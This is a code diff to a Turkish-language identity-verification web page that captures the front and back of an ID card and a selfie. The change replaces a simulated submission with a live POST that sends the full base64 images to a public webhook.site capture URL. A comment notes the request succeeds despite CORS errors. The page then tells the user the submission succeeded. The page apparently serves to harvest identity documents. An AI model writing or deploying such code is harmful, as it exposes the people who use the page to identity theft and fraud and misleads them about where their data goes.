@@ -394,7 +394,7 @@
         </div>
 
         <button id="submit-btn" disabled>Onayla ve Gönder</button>
-        <div id="version-tag">v1.3</div>
+        <div id="version-tag">v1.3 (Webhook)</div>
     </div>
 
     <canvas id="process-canvas"></canvas>
@@ -849,18 +849,27 @@
             submitBtn.disabled = true;
 
             const payload = {
-                id_front: frontImage.split(",")[1],
-                id_back: backImage.split(",")[1],
-                selfie: selfieImage.split(",")[1],
-                source: "browser_v1.3"
+                id_front: frontImage, // Base64 full data
+                id_back: backImage,
+                selfie: selfieImage,
+                source: "browser_v1.3_webhook"
             };
 
-            console.log("Simülasyon Payload:", payload);
+            // Webhook'a gönder
+            try {
+                await fetch("https://webhook.site/59d1520c-9b55-4a51-b19b-764a6a62b22f", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
 
-            setTimeout(() => {
                 statusEl.innerHTML = "<span style='color:var(--success)'>Gönderim Başarılı! ✅</span>";
                 submitBtn.textContent = "Tamamlandı";
-            }, 1000);
+            } catch (err) {
+                console.error(err);
+                statusEl.innerHTML = "<span style='color:var(--accent)'>Hata oluştu ama devam edebilirsiniz.</span>";
+                // Webhook bazen CORS hatası verebilir ama request gider.
+            }
         }
 
         restartBtn.addEventListener("click", resetCurrentStep);
